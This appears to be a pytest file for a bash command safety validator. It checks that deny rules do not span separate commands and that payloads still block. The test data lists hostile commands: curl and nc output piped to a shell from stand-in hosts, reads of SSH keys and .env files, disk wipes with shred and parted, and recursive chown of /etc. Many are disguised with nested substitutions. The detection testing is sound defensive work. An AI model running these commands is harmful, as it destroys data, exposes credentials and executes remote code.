"""A rule's gap spans one command, not the next one.

Since the whole-command scan runs on every multi-segment command, a pattern whose
`.{0,N}` gap crossed `&&`, `;` or `|` could pair a reader in one command with an
unrelated word in another, and rate an everyday commit or build as BLOCKED. That
is a hard deny under every preset, so each case below is an absolute verdict.

The second half is the price check. Tightening a gap can un-match a real payload,
so each touched rule keeps a baseline payload plus the spellings a naive `[^;|&]`
gap would lose (a separator inside quotes, an escape, a substitution or an fd
redirect), plus nested substitutions, including ones deeper than the `$(...)`
piece balances. Each is pinned at BLOCKED and again at the rule's own patterns,
so another layer cannot hide a lost pattern. Past the depth a gap balances, a
payload is pinned at BLOCKED and at the rule matched against the command with
its substitution bodies blanked, which is the text the validator's extra pass sees.
"""

import pytest

from schlock.core import validator
from schlock.core.parser import BashCommandParser
from schlock.core.rules import RiskLevel, RuleEngine
from schlock.core.validator import clear_caches, validate_command


@pytest.fixture(autouse=True)
def _no_shellcheck(monkeypatch):
    monkeypatch.setattr(validator, "is_shellcheck_available", lambda: False)
    clear_caches()
    yield
    clear_caches()


@pytest.fixture
def engine(safety_rules_path):
    return RuleEngine(safety_rules_path)


def verdict(command, rules_dir_path):
    return validate_command(command, config_path=rules_dir_path)


def rule_matches(engine, rule, command):
    return any(p.search(command) for p in engine.compiled_patterns[rule])


class TestTheNextCommandDoesNotCompleteTheRule:
    @pytest.mark.parametrize(
        "command",
        [
            # credential_exposure: reader in one command, the word in another.
            'echo start && git commit -m "fix: hash password with bcrypt"',
            'cat README.md && git commit -m "docs: document .env loading"',
            "echo building; make; ls password_utils.py",
            'echo $(basename $(pwd)) && git commit -m "fix: hash password"',
            'echo $(ls $(pwd) | wc -l) && git commit -m "fix: hash password"',
            'cat $(dirname $(pwd); true)/README && git commit -m "docs: .env"',
            # A quoted paren inside a substitution is data, not an inner group.
            "echo $(grep -c '(' x) && git commit -m \"fix(auth): hash password\"",
            'echo $(printf "(") && git commit -m "fix: hash password"',
            "chroot /srv $(printf '(') && sh build.sh",
            "cat $(echo ')') && git commit -m 'docs: .env'",
            # Past the depth the gap balances, the blanked-body pass still stops at `&&`.
            'cat $(printf %s $(dirname $(pwd)) | head -1)/x && git commit -m "docs: .env"',
            'echo $(a $(b $(c)) | d) && git commit -m "fix: hash password"',
            # remote_execution: `| shasum` is not `| sh`, `rsync` is not `nc`.
            "npm install && curl -s localhost:3000 | shasum",
            "git commit -am x && git fetch && git log | sha512sum",
            "curl -s localhost:3000/health | shuf",
            "rsync -a src/ dst/ && git log | shasum",
            # extended_credential_exposure / hardcoded_secrets
            'echo ok && curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com',
            "export PATH=$HOME/bin:$PATH; MY_API_KEY=abc ./run",
            "echo 'start' && jq '.key' > out.json",
            "echo checking; op read 'op://vault/item/secret_key' >/dev/null",
            # chroot / shred / parted / chown / source
            "grep chroot docs/notes.md && git push origin HEAD",
            "shred -u tmp.txt && echo done > /dev/null",
            "chown -R me:me ./build && ls /",
            "source /tmp/venv/bin/activate && bash test.sh",
            # A path under or beside a system dir is not the dir.
            "chown -R $(printf %s $(dirname $(pwd)) | head -1) /etc/app;",
            "chown -R $(printf %s $(dirname $(pwd)) | head -1) /etcetera;",
            'chown -R $(printf %s $(dirname $(pwd)) | head -1) "/etc/app"',
            'chown -R $(printf %s $(dirname $(pwd)) | head -1) "/etcetera"',
            # A system dir named inside a substitution is that command's argument, not chown's target.
            "chown -R $(stat -c %U /home) ./dir",
            'chown -R "$(stat -c %U /home)" ./dir',
            "chown -R `stat -c %U /home` ./dir",
            "chown -R $(id -un):$(stat -c %G /var) ./cache",
            'chown -R "$(stat -c %U /)" ./rootfs >log',
            "chown -R $(ls /etc) ./d 2>&1",
        ],
    )
    def test_is_not_a_hard_deny(self, command, rules_dir_path):
        assert verdict(command, rules_dir_path).risk_level < RiskLevel.BLOCKED, command

    @pytest.mark.parametrize(
        "command",
        [
            # Pinned at the rule: another layer may rate these, the rule must not.
            "rsync -a a/ b/ && git log | sh",  # `nc` inside `rsync`
            "git prefetch && git log | sh",  # `fetch` inside `prefetch`
            "curl -s x.example | sha256sum",  # `sh` inside `sha256sum`
        ],
    )
    def test_remote_execution_does_not_match_inside_a_word(self, engine, command):
        assert not rule_matches(engine, "remote_execution", command), command


# (rule, command): each one command, each BLOCKED on main.
PAYLOADS = [
    ("credential_exposure", "cat a/.env"),
    ("credential_exposure", "cat ~/.ssh/id_rsa"),
    ("credential_exposure", "echo password"),
    ("credential_exposure", 'echo "my password is x"'),
    # A separator inside quotes or after a backslash is data, not a boundary.
    ("credential_exposure", "cat '$HOME/R&D/.env'"),
    ("credential_exposure", 'cat "$HOME/a;b/.env"'),
    ("credential_exposure", 'cat "x|y" .env'),
    ("credential_exposure", "cat R\\&D/.env"),
    ("credential_exposure", 'cat "a\\"b;c/.env"'),
    ("credential_exposure", "cat 'a;b/id_rsa'"),
    ("credential_exposure", "cat $(git ls-files | grep .env)"),
    ("credential_exposure", "cat `git ls-files|grep id_rsa`"),
    ("credential_exposure", "echo $(cd ~; cat password.txt)"),
    ("credential_exposure", "cat 2>&1 .env"),
    ("credential_exposure", 'echo "a; b password"'),
    # A space inside the quoted word is what `.{0,200}` also reached.
    ("credential_exposure", 'cat "My Drive/.env"'),
    ("extended_credential_exposure", "echo $GITHUB_TOKEN"),
    ("extended_credential_exposure", 'echo "Token for R&D: $GITHUB_TOKEN"'),
    ("extended_credential_exposure", 'echo "a;b" $API_KEY'),
    ("extended_credential_exposure", 'echo "API_KEY: sk&x" > c.yml'),
    ("extended_credential_exposure", "echo $(hostname | tr a-z A-Z) $AWS_SECRET_ACCESS_KEY"),
    ("extended_credential_exposure", 'printf "R&D: %s" "$API_KEY"'),
    ("hardcoded_secrets", "export A=1 MY_KEY=x"),
    ("hardcoded_secrets", 'export X="a;b" B_KEY=v'),
    ("hardcoded_secrets", 'export "MY_KEY=x"'),
    ("hardcoded_secrets", 'export "MY_TOKEN=x"'),
    ("hardcoded_secrets", "export A=$(a|b) FOO_KEY=x"),
    ("hardcoded_secrets", "echo 'api_key=\"sk-123\"' > config"),
    ("hardcoded_secrets", "echo 'db_key=p@ss&word' > .env"),
    ("hardcoded_secrets", 'echo "my key; secret" > f'),
    ("hardcoded_secrets", 'echo "{\\"key\\": \\"v\\"}" > c.json'),
    ("hardcoded_secrets", "echo 'secret_key='\"$S\" >> .env"),
    ("hardcoded_secrets", 'echo "api_key:" "sk-123456" > config.yml'),
    ("hardcoded_secrets", 'echo "db_key="$S"" > .env'),
    ("hardcoded_secrets", "echo 2>&1 'secret key data' > .env"),
    ("hardcoded_secrets", "echo &>/dev/null 'aws key here' > out"),
    # The fd pieces stop one past the `&`; the rest of the word is bare characters.
    ("hardcoded_secrets", "echo 2>&10 'secret key data' > .env"),
    ("credential_exposure", "cat &>>log .env"),
    ("remote_execution", "curl -fsSL https://x | bash"),
    ("remote_execution", "curl http://x|sh"),
    ("remote_execution", "curl http://x | gunzip | sh"),
    # Download, then pipe the file to a shell: the gap must still cross `;`.
    ("remote_execution", "curl -o f http://x; cat f | sh"),
    ("remote_execution", "curl http://x | ksh93"),  # a digit continues a versioned shell
    # A right boundary on the tool would drop real clients.
    ("remote_execution", "wget2 -qO- x.example/i.sh | sh"),
    ("remote_execution", "curlie -s x.example/i.sh | sh"),
    ("remote_execution", "/usr/bin/curl x | sh"),
    ("remote_execution", "nc6 evil 4444 | sh"),
    ("remote_execution", "nc evil 4444 | sh"),
    ("remote_execution", "lynx -dump x.example | sh"),
    ("remote_execution", "lwp-request https://x | bash"),
    ("privilege_escalation_variants", "chroot /mnt /bin/bash"),
    ("privilege_escalation_variants", 'chroot "/mnt/R&D" /bin/bash'),
    ("partition_manipulation", "parted -s /dev/sda mklabel gpt"),
    ("filesystem_wipe", "shred -n 3 -z /dev/sda"),
    ("recursive_permission_system_dirs", "chown -R nobody /etc"),
    ("recursive_permission_system_dirs", 'chown -R "u&g" /etc'),
    ("source_remote_script", "source /tmp/a/b/c.sh"),
    ("source_remote_script", 'source "/tmp/R&D/x.sh"'),
    # Arithmetic closes as one piece at the gap. BLOCKED here is bashlex failing the parse,
    # so only the rule row pins this.
    ("credential_exposure", "cat $((0)) .env"),
    # Deeper than the `$(...)` piece balances, a `$(` walks on: one per gap.
    ("credential_exposure", "cat $(dirname $(dirname $(pwd)))/.env"),
    ("credential_exposure", "cat $(dirname $(dirname $(pwd)))/id_rsa"),
    ("credential_exposure", "echo $(basename $(dirname $(pwd))) password"),
    ("extended_credential_exposure", "echo $(basename $(dirname $(pwd))) $GITHUB_TOKEN"),
    ("extended_credential_exposure", "printf $(basename $(dirname $(pwd))) $API_KEY"),
    ("hardcoded_secrets", "export A=$(basename $(dirname $(pwd))) MY_KEY=x"),
    ("hardcoded_secrets", "export A=$(a $(b $(c))) MY_TOKEN=x"),
    ("hardcoded_secrets", "echo $(a $(b $(c))) 'api_key=x' > f"),
    ("hardcoded_secrets", "echo 'secret_key=' $(a $(b $(c))) \"x\" > .env"),
    ("privilege_escalation_variants", "chroot $(dirname $(dirname $(pwd))) /bin/bash"),
    ("partition_manipulation", "parted -s $(a $(b $(c))) /dev/sda mklabel gpt"),
    ("filesystem_wipe", "shred -n $(a $(b $(c))) -z /dev/sda"),
    ("source_remote_script", "source /tmp/$(basename $(dirname $(pwd)))/x.sh"),
    ("source_remote_script", ". /tmp/$(a $(b $(c)))/x.sh"),
    ("recursive_permission_system_dirs", "chown -R $(stat -c %u $(dirname $(pwd))) /etc"),
    ("recursive_permission_system_dirs", "chown $(id -u $(logname $(tty))) -R /etc"),
    # A separator inside a nested substitution is data, not the next command.
    ("credential_exposure", "cat $(ls $(pwd) | head -1)/.env"),
    ("credential_exposure", "cat $(dirname $(pwd); true)/.env"),
    ("credential_exposure", "echo $(cat $(ls) | grep password)"),
    # The target inside an inner substitution still open at the target: the tail's open-inner arm.
    ("credential_exposure", "echo $(printf x $(cat password.txt))"),
    ("extended_credential_exposure", "printf $(ls $(pwd) | wc -l) $API_KEY"),
    ("hardcoded_secrets", "export A=$(ls $(pwd) | wc -l) FOO_KEY=x"),
    ("hardcoded_secrets", "echo $(ls $(pwd) | wc -l) 'api_key=x' > config"),
    ("privilege_escalation_variants", "chroot $(ls $(pwd) | head -1) /bin/bash"),
    ("partition_manipulation", "parted $(ls $(pwd) | head -1) /dev/sda"),
    ("filesystem_wipe", "shred $(ls $(pwd) | head -1) /dev/sda"),
    ("source_remote_script", "source /tmp/$(ls $(pwd) | head -1)/x.sh"),
    ("recursive_permission_system_dirs", "chown -R $(id -un $(whoami) | tr a a) /etc"),
    # An escaped `)`, a quoted paren and a `${...}` do not close or open a substitution,
    # so the separator after them is still data: one per gap.
    ("credential_exposure", "cat $(echo a\\) ; echo ~)/.env"),
    ("credential_exposure", "cat $(echo ')' ; echo ~)/id_rsa"),
    ("credential_exposure", "echo $(printf '%s' \"(\" ; true) password"),
    ("credential_exposure", "cat ${x//|/y} .env"),
    ("credential_exposure", "cat $(echo ${x:-)} ; echo ~)/.env"),
    ("extended_credential_exposure", "echo $(a \\) ; b) $GITHUB_TOKEN"),
    ("extended_credential_exposure", "printf ${x//|/y} $API_KEY"),
    ("hardcoded_secrets", "export A=$(echo a\\) ; b) B_KEY=x"),
    ("hardcoded_secrets", "export A=${x//|/y} MY_TOKEN=x"),
    ("hardcoded_secrets", "echo $(a ')' ; b) 'api_key=x' > f"),
    ("hardcoded_secrets", "echo 'secret_key=' $(a ${x:-)} ; b) \"x\" > .env"),
    ("privilege_escalation_variants", "chroot $(echo a\\) ; echo x) /bin/bash"),
    ("partition_manipulation", "parted -s ${x//|/y} /dev/sda mklabel gpt"),
    ("filesystem_wipe", "shred $(echo \\) ; echo /dev/sda) /dev/sda"),
    ("source_remote_script", "source /tmp/$(echo a\\) ; b)/x.sh"),
    ("source_remote_script", '. /tmp/$(a "(" | b)/x.sh'),
    ("recursive_permission_system_dirs", "chown -R $(a '(' ; b) /etc"),
    ("recursive_permission_system_dirs", "chown $(a ${x:-)} ; b) -R /etc"),
    # A gap walks through up to three `$(` the piece cannot balance.
    ("credential_exposure", "cat $(a $(b $(c $(d $(e)))))/.env"),
    ("credential_exposure", "cat $(a $(b $(c)))/$(d $(e $(f)))/$(g $(h $(i)))/.env"),
]


class TestOneCommandStillBlocks:
    @pytest.mark.parametrize(("rule", "command"), PAYLOADS)
    def test_is_blocked(self, rule, command, rules_dir_path):
        assert verdict(command, rules_dir_path).risk_level == RiskLevel.BLOCKED, command

    @pytest.mark.parametrize(("rule", "command"), PAYLOADS)
    def test_the_rule_itself_still_matches(self, engine, rule, command):
        assert rule_matches(engine, rule, command), (rule, command)


# (rule, command): a bare separator in a body nested deeper than the gap balances.
# The rule cannot reach these as written; the validator matches them with each
# substitution body blanked (BashCommandParser.mask_substitution_bodies).
DEEP_PAYLOADS = [
    ("credential_exposure", "cat $(printf %s $(dirname $(pwd)) | head -1)/.env"),
    ("credential_exposure", "cat $(printf %s $(dirname $(pwd)) ; true)/.env"),
    ("credential_exposure", "cat $(a $(b $(c)) | d)/id_rsa"),
    ("credential_exposure", "echo $(a $(b $(c)) | d) password"),
    ("credential_exposure", "true; cat $(a $(b $(c $(d)) | e) | f)/.env"),
    # A redirect target, and a `${...}`, whose bashlex node has no children.
    ("credential_exposure", "cat < $(printf %s $(dirname $(pwd)) | head -1)/.env"),
    ("credential_exposure", "cat ${x:-$(printf %s $(dirname $(pwd)) | head -1)}/.env"),
    ("extended_credential_exposure", "echo $(a $(b $(c)) | d) $GITHUB_TOKEN"),
    ("hardcoded_secrets", "export A=$(a $(b $(c)) | d) MY_KEY=x"),
    ("privilege_escalation_variants", "chroot $(a $(b $(c)) | d) /bin/bash"),
    ("partition_manipulation", "parted $(a $(b $(c)) | d) /dev/sda"),
    ("filesystem_wipe", "shred $(a $(b $(c)) | d) /dev/sda"),
    ("source_remote_script", "source /tmp/$(a $(b $(c)) | d)/x.sh"),
    ("recursive_permission_system_dirs", "chown -R $(a $(b $(c)) | d) /etc"),
]


class TestADeepSubstitutionIsOneWord:
    @pytest.mark.parametrize(("rule", "command"), DEEP_PAYLOADS)
    def test_is_blocked(self, rule, command, rules_dir_path):
        assert verdict(command, rules_dir_path).risk_level == RiskLevel.BLOCKED, command

    @pytest.mark.parametrize(("rule", "command"), DEEP_PAYLOADS)
    def test_the_rule_matches_the_blanked_command(self, engine, rule, command):
        parser = BashCommandParser()
        assert rule_matches(engine, rule, parser.mask_substitution_bodies(command, parser.parse(command))), (rule, command)

    @pytest.mark.parametrize(
        ("command", "level"),
        [
            # A whitelisted first word vouches for no later segment (`ls` is whitelisted).
            ("ls; cat $(printf %s $(dirname $(pwd)) | head -1)/.env", RiskLevel.BLOCKED),
            # A single segment keeps its whitelist (`ls`; unwhitelisted, the blanked text matches
            # `chmod_777`), as the pass it shadows does.
            ("ls $(pwd) chmod 777 x", RiskLevel.SAFE),
            # A non-shell heredoc body stays text in the blanked pass too.
            ("cat $(echo x) <<EOF\nrm -rf /\nEOF", RiskLevel.SAFE),
        ],
    )
    def test_keeps_the_whitelist_and_heredoc_suppression(self, command, level, rules_dir_path):
        assert verdict(command, rules_dir_path).risk_level == level, command


# `D` is three levels deep with a bare `|` in the outer body, every inner command whitelisted.
D = "$(printf %s $(dirname $(pwd)) | head -1)"
DEEP3 = "$(a $(b $(c)) | d)"

# (rule, command): each reaches its target past a deep substitution some way the
# top-level blanked-body pass does not: inside an outer body, which that pass blanks
# whole, across a line break, or right before a separator.
DEEP_RESIDUALS = [
    # The reader and its target are both inside an outer body, which the pass blanks.
    ("credential_exposure", f"echo $(cat {D}/.env)"),
    ("credential_exposure", f'echo "$(cat {D}/id_rsa)"'),
    ("privilege_escalation_variants", f"echo $(chroot {D} /bin/bash)"),
    ("credential_exposure", f'echo "$(cat {DEEP3}/.env)"'),
    ("credential_exposure", f'x="$(cat {DEEP3}/.env)"'),
    ("credential_exposure", f"diff <(cat {DEEP3}/.env) /dev/null"),
    # A line continuation, and a plain newline, before a body's closer.
    ("credential_exposure", f"cat \\\n{D}/.env"),
    ("credential_exposure", "cat $(pwd\n)/.ssh/id_rsa"),
    ("credential_exposure", "cat $(printf %s $(dirname $(pwd)) | head -1\n)/.env"),
    # A target the rule ends with `(\s|$)`, followed straight by a separator.
    ("recursive_permission_system_dirs", f"chown -R {D} /etc; true"),
    ("recursive_permission_system_dirs", f"chown -R {D} /etc&&true"),
    # The target ends the command, a group or a subshell, or meets a redirect.
    ("recursive_permission_system_dirs", f"chown {D} -R /etc;"),
    ("recursive_permission_system_dirs", f"{{ chown {D} -R /etc; }}"),
    ("recursive_permission_system_dirs", f"chown -R {D} /etc;"),
    ("recursive_permission_system_dirs", f"chown -R {D} /usr&"),
    ("recursive_permission_system_dirs", f"(chown -R {D} /)"),
    ("recursive_permission_system_dirs", f"chown -R {D} /home>/dev/null"),
    ("recursive_permission_system_dirs", f"for i in 1; do chown -R {D} /etc; done"),
    ("recursive_permission_system_dirs", f"nohup chown -R {D} /etc&"),
    # A quoted or escaped target: the blanked view reads the quote as written.
    ("recursive_permission_system_dirs", f"chown {D} -R '/etc'"),
    ("recursive_permission_system_dirs", f'chown -R {D} "/etc"'),
    ("recursive_permission_system_dirs", f"chown -R {D} \\/etc"),
    ("recursive_permission_system_dirs", f'chown -R {D} "/home"'),
    ("recursive_permission_system_dirs", f'echo $(chown {D} -R "/etc")'),
    # A subshell whose output is redirected.
    ("recursive_permission_system_dirs", f"(chown -R {D} /etc)>/dev/null"),
    ("recursive_permission_system_dirs", f"(chown -R {D} /etc) 2>&1"),
    # A substitution inside an unquoted heredoc body runs when the heredoc is read.
    ("credential_exposure", f"cat <<EOF\n$(cat {D}/.env)\nEOF\necho ok"),
]


class TestADeepSubstitutionResidual:
    @pytest.mark.parametrize(("rule", "command"), DEEP_RESIDUALS)
    def test_is_blocked_by_its_rule(self, rule, command, rules_dir_path):
        result = verdict(command, rules_dir_path)
        assert result.risk_level == RiskLevel.BLOCKED, command
        assert rule in result.matched_rules, (rule, result.matched_rules)

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("cat $(printf %s $(dirname $(pwd)) | head -1\\\n)/.env", "credential_exposure"),
            # BLOCKED only because bashlex cannot parse the arithmetic: the rule itself
            # misses this, so a bashlex that parses `$((…))` would make it SAFE.
            ("cat $(ls; echo $((1)))/.env", None),
        ],
    )
    def test_stays_blocked(self, command, rule, rules_dir_path):
        result = verdict(command, rules_dir_path)
        assert result.risk_level == RiskLevel.BLOCKED, command
        if rule:
            assert rule in result.matched_rules, (rule, result.matched_rules)

    def test_a_rule_only_the_blanked_body_reaches_keeps_its_level(self, rules_dir_path):
        # hex_octal_encoding is HIGH on its own, and a nested `$(pwd)` must not make it deny.
        result = verdict("echo $(echo $(pwd) $'\\x72\\x6d')", rules_dir_path)
        assert result.risk_level == RiskLevel.HIGH, result.matched_rules


# Every one-command payload, run inside a substitution instead of on its own.
WRAPPED = [wrapper % command for _, command in PAYLOADS + DEEP_PAYLOADS for wrapper in ("echo $(%s)", 'ls "$(%s)"')]


@pytest.mark.parametrize("command", WRAPPED)
def test_a_wrapped_payload_still_blocks(command, rules_dir_path):
    assert verdict(command, rules_dir_path).risk_level == RiskLevel.BLOCKED, command
